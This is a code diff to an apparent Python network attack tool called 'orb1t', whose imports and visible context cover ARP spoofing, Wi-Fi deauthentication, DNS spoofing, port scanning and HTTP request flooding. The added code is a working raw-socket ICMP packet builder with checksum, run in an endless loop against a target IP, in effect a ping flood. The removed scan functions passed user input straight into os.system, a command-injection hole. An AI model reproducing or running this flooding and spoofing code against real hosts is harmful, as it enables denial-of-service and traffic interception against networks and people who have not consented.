@@ -3,6 +3,7 @@
 import os; os.system('mode con: cols=120 lines=30')
 import socket
 import threading
+import struct
 import time
 import logging
 from scapy.all import ARP, Ether, send, srp, RadioTap, Dot11, sendp, Dot11Deauth, DNS, DNSRR, IP, UDP, sniff
@@ -22,6 +23,7 @@ class orb1t:
         self.setup_logging()
         self.running = True
         self.requested_domain = None
+    
         self.spoofed_ip = None
         self.ttl = None
         self.packet_count = 0
@@ -40,7 +42,11 @@ class orb1t:
             "randomize_port": False,
             "packet_size": 1024
         }
-    
+        
+
+    def log(self, message):
+     print(message)
+
     def port_scan(self):  
         target = input(Fore.YELLOW + "Enter target IP or domain for port scanning: ")
         start_port = int(input(Fore.YELLOW + "Enter start port: "))
@@ -281,23 +287,60 @@ PURPOSES ONLY.
             threading.Thread(target=self.send_http_requests, args=(self.settings["target"], payload)).start()
 
     
+    def checksum(self, source_string):
+        """Calculate the checksum of the packet (RFC 1071)."""
+        sum = 0
+        max_count = (len(source_string) // 2) * 2
+        count = 0
+        while count < max_count:
+            val = source_string[count + 1] * 256 + source_string[count]
+            sum = sum + val
+            sum = sum & 0xffffffff  
+            count = count + 2
+
+        if max_count < len(source_string):
+            sum = sum + source_string[len(source_string) - 1]
+            sum = sum & 0xffffffff
+
+        sum = (sum >> 16) + (sum & 0xffff)
+        sum = sum + (sum >> 16)
+        answer = ~sum
+        answer = answer & 0xffff
+        answer = answer >> 8 | (answer << 8 & 0xff00)
+        return answer
+
+    def generate_icmp_packet(self, packet_id):
+        type = 8  
+        code = 0
+        checksum = 0
+        identifier = packet_id
+        sequence = random.randint(1, 32767)  
+        header = struct.pack("bbHHh", type, code, checksum, identifier, sequence)
+        data = os.urandom(56)  
+
+        calculated_checksum = self.checksum(header + data)
+        header = struct.pack("bbHHh", type, code, calculated_checksum, identifier, sequence)
+
+        return header + data
 
     def send_icmp_packets(self, target_ip):
-     while self.running:
-        try:
-            packet = self.generate_icmp_packet()
-            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
-                sock.sendto(packet, (target_ip, 0))
-                with self.lock:
-                    self.packet_count += 1
-                self.log(Fore.MAGENTA + f"Sent ICMP packet to {target_ip}")
+        packet_id = random.randint(1, 65535)
+        while self.running:
+            try:
+                packet = self.generate_icmp_packet(packet_id)
+                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
+                    sock.sendto(packet, (target_ip, 0))
+                    with self.lock:
+                        self.packet_count += 1
+                    self.log(Fore.MAGENTA + f"Sent ICMP packet to {target_ip}")
+            except Exception as e:
+                self.log(Fore.RED + f"ICMP Error: {e}")
             self.report_packets()
-        except Exception as e:
-            self.log(Fore.RED + f"ICMP Error: {e}")
 
-      
-    def generate_icmp_packet(self):
-        return b'\x08\x00\x00\x00'
+    def report_packets(self): 
+        print(Fore.GREEN + f"Packets Sent: {self.packet_count}")
+
+
     
     def send_packets(self, target_ip):
         protocol = self.settings["protocol"].lower()
@@ -357,33 +400,6 @@ PURPOSES ONLY.
 
 
 
-    def scan(self, command):
-        if command == "scnip":
-            self.scan_ip()
-        elif command == "scndomain":
-            self.scan_domain()
-        else:
-            print(Fore.RED + "Invalid scan command.")
-
-
-    def scan_ip(self):
-        ip = input(Fore.YELLOW + "Enter IP address to ping: ")
-        print(Fore.GREEN + f"Pinging IP {ip}...")
-        response = os.system(f"ping -c 1 {ip}")
-        if response == 0:
-            print(Fore.GREEN + f"IP {ip} is reachable.")
-        else:
-            print(Fore.RED + f"IP {ip} is not reachable.")
-
-    def scan_domain(self):
-        domain = input(Fore.YELLOW + "Enter domain to scan: ")
-        try:
-            ip = socket.gethostbyname(domain)
-            print(Fore.GREEN + f"The domain {domain} resolves to IP: {ip}")
-        except socket.gaierror:
-            print(Fore.RED + f"Could not resolve domain {domain}.")
-
-    
 
     def interactive_arp_spoofing(self):
         target_ip = input(Fore.YELLOW + "Enter target IP address: ")
